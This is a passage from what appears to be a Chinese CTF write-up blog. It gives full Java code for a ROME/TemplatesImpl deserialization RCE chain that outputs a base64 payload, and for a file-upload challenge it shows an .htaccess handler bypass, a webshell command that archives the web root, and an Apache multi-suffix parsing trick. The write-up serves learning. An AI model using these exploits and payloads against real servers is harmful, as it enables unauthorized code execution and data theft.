&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);	<span class="comment">// A4</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>A4 处反序列化 payload 中的恶意字节码将会被读取，回到上一层函数，在 A5 处恶意字节码被解析调用，从而触发 RCE。</p>
<p>注意调用栈中标记的 A1 与 A2 节点，当 IDEA 进入两个节点之间（包括节点本身）的源码处时字节码会被直接加载，导致 RCE 被提前执行，<code>_class=true</code> 会在上述操作完成时从 <code>true</code> 变为 <code>false</code> 。因此直接从入口节点 <code>hashCode()</code> 往下调试会失败，必须跳过指定节点段来避免字节码的提前加载，从而看到完整的调用链。</p>
<h4 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h4><p>首先需要导入 <code>javassist, rhino</code> 包：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">​</span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mozilla<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rhino<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>触发 <code>getOutputProperties()</code> 链条的测试代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;aaaaaaaaaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Class[] types = &#123;<span class="type">byte</span>[][].class, String.class, Properties.class, <span class="type">int</span>.class, TransformerFactoryImpl.class&#125;;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> templatesimpl.getDeclaredConstructor(types);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TransformerFactoryImpl</span> <span class="variable">tf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        Object[] params = &#123;bytecodes,<span class="string">&quot;test&quot;</span>,p,<span class="number">1</span>,tf&#125;;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(params);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> templatesimpl.getMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        method.invoke(object);	<span class="comment">// A6</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后能成功执行语句 <code>System.out.println(&quot;aaaaaaaaaaa&quot;)</code> ，但也会抛出错误：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.reflect.InvocationTargetException</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:<span class="number">498</span>)</span><br><span class="line">	at myremo.EXP.main(EXP.java:<span class="number">30</span>)</span><br></pre></td></tr></table></figure></div>

<p>A6 处调用了 <code>TemplatesImpl.getOutputProperties(constructor.newInstance(params))</code> 函数，下断点直接来到 A3 处且条件为 true，接下来就是读取恶意字节码并生成实例，以完成 RCE。（目前知识有限，没法弄清这里到底发生了什么…）</p>
<p>完整构造链的测试（更看不懂了 &#x3D; &#x3D;）：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myremo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化类并设置属性</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldByteCodes</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldByteCodes.set(templatesimpl, bytecodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(templatesimpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldTfactory</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        fieldTfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldTfactory.set(templatesimpl, Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>).newInstance());</span><br><span class="line">        <span class="comment">// 注意要通过2个objectbean才能达成触发条件</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesimpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashmap.put触发</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(objectBean2,<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试了整条构造链的可行性，用 <code>hashmap.put()</code> 来模拟反序列化中调用 <code>hashCode()</code> 函数的行为，触发该函数入口。</p>
<p>构造完整利用链条的 EXP：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化类并设置属性</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldByteCodes</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldByteCodes.set(templatesimpl, bytecodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(templatesimpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldTfactory</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        fieldTfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldTfactory.set(templatesimpl, Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>).newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 要通过2个objectbean才能达成触发条件</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesimpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置hashmap，参考ysoserial</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldsize</span> <span class="operator">=</span> hashmap.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        fieldsize.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldsize.set(hashmap,<span class="number">2</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">nodeC</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        Object tbl = Array.newInstance(nodeC, 2); 也可以只写入objectBean2, 就是会报错(但还是执行了命令)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean1, objectBean1, null));</span></span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, objectBean2, objectBean2, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldtable</span> <span class="operator">=</span> hashmap.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        fieldtable.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldtable.set(hashmap,tbl);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出base64后的序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        out.writeObject(hashmap);</span><br><span class="line">        <span class="type">byte</span>[] sss = byteArrayOutputStream.toByteArray();</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(sss);</span><br><span class="line">        System.out.println(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>更改要执行的命令运行程序即可获得 base64 编码后的 payload，如果要传入服务器记得还需要 URL 编码。</p>
<h2 id="WEB-Week5"><a href="#WEB-Week5" class="headerlink" title="WEB-Week5"></a>WEB-Week5</h2><h3 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h3><p><em>文件上传 <code>.htaccess</code> 文件</em></p>
<p>后端防火墙采用了黑名单，过滤了 <code>php, php3, phtml, pHp, png.php</code> 等诸多关键词与绕过 tricks。但允许上传 <code>.htaccess</code> 文件，文件内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.png&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<p>上传后上传一个图片格式的一句话木马，测试有效，则 GetShell 成功。</p>
<p>flag 在 env 中，可以用：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tar+-czvf+/var/www/html/upload/html.tar.gz+/var/www/html&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p>打包题目源码，直接访问 <code>/upload/html.tar.gz</code> 即可下载。</p>
<p>“index.php”：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=<span class="string">&quot;center&quot;</span>&gt;大家好，这是一个不会写前端的web手做的图片渲染器，上传图片，我会帮你渲染出来的&lt;/h1&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$extension</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="variable">$extension</span> = <span class="string">&quot;.&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$extension</span>));</span><br><span class="line">            <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>, <span class="string">&quot;.php5&quot;</span>, <span class="string">&quot;.php4&quot;</span>, <span class="string">&quot;.php3&quot;</span>, <span class="string">&quot;.php2&quot;</span>, <span class="string">&quot;.php1&quot;</span>, <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.htm&quot;</span>, <span class="string">&quot;.phtml&quot;</span>, <span class="string">&quot;.pht&quot;</span>, <span class="string">&quot;.pHp&quot;</span>, <span class="string">&quot;.pHp5&quot;</span>, <span class="string">&quot;.pHp4&quot;</span>, <span class="string">&quot;.pHp3&quot;</span>, <span class="string">&quot;.pHp2&quot;</span>, <span class="string">&quot;.pHp1&quot;</span>, <span class="string">&quot;.Html&quot;</span>, <span class="string">&quot;.Htm&quot;</span>, <span class="string">&quot;.pHtml&quot;</span>, <span class="string">&quot;.jsp&quot;</span>, <span class="string">&quot;.jspa&quot;</span>, <span class="string">&quot;.jspx&quot;</span>, <span class="string">&quot;.jsw&quot;</span>, <span class="string">&quot;.jsv&quot;</span>, <span class="string">&quot;.jspf&quot;</span>, <span class="string">&quot;.jtml&quot;</span>, <span class="string">&quot;.jSp&quot;</span>, <span class="string">&quot;.jSpx&quot;</span>, <span class="string">&quot;.jSpa&quot;</span>, <span class="string">&quot;.jSw&quot;</span>, <span class="string">&quot;.jSv&quot;</span>, <span class="string">&quot;.jSpf&quot;</span>, <span class="string">&quot;.jHtml&quot;</span>, <span class="string">&quot;.asp&quot;</span>, <span class="string">&quot;.aspx&quot;</span>, <span class="string">&quot;.asa&quot;</span>, <span class="string">&quot;.asax&quot;</span>, <span class="string">&quot;.ascx&quot;</span>, <span class="string">&quot;.ashx&quot;</span>, <span class="string">&quot;.asmx&quot;</span>, <span class="string">&quot;.cer&quot;</span>, <span class="string">&quot;.aSp&quot;</span>, <span class="string">&quot;.aSpx&quot;</span>, <span class="string">&quot;.aSa&quot;</span>, <span class="string">&quot;.aSax&quot;</span>, <span class="string">&quot;.aScx&quot;</span>, <span class="string">&quot;.aShx&quot;</span>, <span class="string">&quot;.aSmx&quot;</span>, <span class="string">&quot;.cEr&quot;</span>, <span class="string">&quot;.sWf&quot;</span>, <span class="string">&quot;.swf&quot;</span>, <span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;上传木马可不是好习惯～～～&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;upload/&quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) . <span class="string">&quot;&#x27;&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;form align=<span class="string">&quot;center&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>还可以利用『Apache多后缀解析漏洞（apache_parsing_vulnerability）』解决。</p>
<blockquote>
<p>apache httpd 支持一个文件多个后缀，windows 对于多后缀的识别是看最后一个”.”之后的后缀名。apache对于多后缀文件的识别是从后往前识别，最后一个后缀不能被识别时，会往前识别</p>
</blockquote>
<p>因此上传文件时，将后缀名改为无意义的后缀，即可被 apache 服务器忽略并解析前面的内容，例如”.php.123”会被解析为 php 文件。</p>
